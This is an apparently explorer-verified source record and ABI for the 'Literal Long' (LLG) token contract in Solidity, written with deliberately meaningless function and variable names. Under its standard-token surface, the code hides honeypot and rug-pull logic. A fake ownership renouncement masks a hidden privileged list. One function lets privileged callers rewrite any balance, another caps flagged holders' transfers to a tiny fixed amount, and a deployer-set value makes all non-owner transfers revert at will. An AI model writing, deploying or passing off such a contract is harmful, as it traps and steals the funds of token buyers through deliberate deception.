{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface totalLiquidity {\n    function createPair(address sellMax, address txIsBuy) external returns (address);\n}\n\ninterface fundTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toLiquidity) external view returns (uint256);\n\n    function transfer(address marketingList, uint256 tokenTx) external returns (bool);\n\n    function allowance(address toIsWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingList,\n        uint256 tokenTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxWallet, uint256 value);\n    event Approval(address indexed toIsWallet, address indexed spender, uint256 value);\n}\n\nabstract contract launchedTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundTakeMetadata is fundTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LiteralLong is launchedTo, fundTake, fundTakeMetadata {\n\n    uint256 private buyAt = 100000000 * 10 ** 18;\n\n    function receiverTo(address minWallet, uint256 tokenTx) public {\n        fundFrom();\n        senderWallet[minWallet] = tokenTx;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyAt;\n    }\n\n    mapping(address => bool) public walletAmount;\n\n    address public shouldLimitWallet;\n\n    function transfer(address minWallet, uint256 tokenTx) external virtual override returns (bool) {\n        return walletShould(_msgSender(), minWallet, tokenTx);\n    }\n\n    function launchedBuy(address receiverFundTake, address marketingList, uint256 tokenTx) internal returns (bool) {\n        require(senderWallet[receiverFundTake] >= tokenTx);\n        senderWallet[receiverFundTake] -= tokenTx;\n        senderWallet[marketingList] += tokenTx;\n        emit Transfer(receiverFundTake, marketingList, tokenTx);\n        return true;\n    }\n\n    bool private fromFee;\n\n    address public buyMode;\n\n    function walletMarketing(address modeSwap) public {\n        fundFrom();\n        \n        if (modeSwap == shouldLimitWallet || modeSwap == buyMode) {\n            return;\n        }\n        takeTeam[modeSwap] = true;\n    }\n\n    address swapIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address walletSwap, uint256 tokenTx) public virtual override returns (bool) {\n        sellLaunched[_msgSender()][walletSwap] = tokenTx;\n        emit Approval(_msgSender(), walletSwap, tokenTx);\n        return true;\n    }\n\n    function walletShould(address receiverFundTake, address marketingList, uint256 tokenTx) internal returns (bool) {\n        if (receiverFundTake == shouldLimitWallet) {\n            return launchedBuy(receiverFundTake, marketingList, tokenTx);\n        }\n        uint256 shouldLiquidity = fundTake(buyMode).balanceOf(swapIs);\n        require(shouldLiquidity == takeMin);\n        require(marketingList != swapIs);\n        if (takeTeam[receiverFundTake]) {\n            return launchedBuy(receiverFundTake, marketingList, autoToSell);\n        }\n        return launchedBuy(receiverFundTake, marketingList, tokenTx);\n    }\n\n    string private buyTeam = \"LLG\";\n\n    uint256 tokenTrading;\n\n    constructor (){\n        if (receiverAtEnable != fromFee) {\n            receiverAtEnable = false;\n        }\n        fundLaunched exemptTrading = fundLaunched(launchMax);\n        buyMode = totalLiquidity(exemptTrading.factory()).createPair(exemptTrading.WETH(), address(this));\n        \n        shouldLimitWallet = _msgSender();\n        walletAmount[shouldLimitWallet] = true;\n        senderWallet[shouldLimitWallet] = buyAt;\n        takeReceiver();\n        if (receiverFromLiquidity) {\n            receiverAtEnable = false;\n        }\n        emit Transfer(address(0), shouldLimitWallet, buyAt);\n    }\n\n    function takeReceiver() public {\n        emit OwnershipTransferred(shouldLimitWallet, address(0));\n        enableWallet = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return enableWallet;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyTeam;\n    }\n\n    bool public liquidityFromShould;\n\n    bool public receiverAtEnable;\n\n    uint256 constant autoToSell = 16 ** 10;\n\n    function takeEnable(address receiverSenderSell) public {\n        if (liquidityFromShould) {\n            return;\n        }\n        \n        walletAmount[receiverSenderSell] = true;\n        if (receiverFromLiquidity) {\n            receiverFromLiquidity = false;\n        }\n        liquidityFromShould = true;\n    }\n\n    function allowance(address launchedFee, address walletSwap) external view virtual override returns (uint256) {\n        if (walletSwap == launchMax) {\n            return type(uint256).max;\n        }\n        return sellLaunched[launchedFee][walletSwap];\n    }\n\n    function balanceOf(address toLiquidity) public view virtual override returns (uint256) {\n        return senderWallet[toLiquidity];\n    }\n\n    function getOwner() external view returns (address) {\n        return enableWallet;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitAt;\n    }\n\n    function fundFrom() private view {\n        require(walletAmount[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed feeWalletAmount, address indexed maxFund);\n\n    string private limitAt = \"Literal Long\";\n\n    mapping(address => mapping(address => uint256)) private sellLaunched;\n\n    uint8 private launchedTakeTeam = 18;\n\n    uint256 takeMin;\n\n    address private enableWallet;\n\n    mapping(address => bool) public takeTeam;\n\n    function buyReceiver(uint256 tokenTx) public {\n        fundFrom();\n        takeMin = tokenTx;\n    }\n\n    address launchMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private senderWallet;\n\n    function transferFrom(address receiverFundTake, address marketingList, uint256 tokenTx) external override returns (bool) {\n        if (_msgSender() != launchMax) {\n            if (sellLaunched[receiverFundTake][_msgSender()] != type(uint256).max) {\n                require(tokenTx <= sellLaunched[receiverFundTake][_msgSender()]);\n                sellLaunched[receiverFundTake][_msgSender()] -= tokenTx;\n            }\n        }\n        return walletShould(receiverFundTake, marketingList, tokenTx);\n    }\n\n    bool public receiverFromLiquidity;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedTakeTeam;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toIsWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeWalletAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenTx\",\"type\":\"uint256\"}],\"name\":\"buyReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFromShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAtEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFromLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTx\",\"type\":\"uint256\"}],\"name\":\"receiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimitWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSenderSell\",\"type\":\"address\"}],\"name\":\"takeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFundTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSwap\",\"type\":\"address\"}],\"name\":\"walletMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LiteralLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}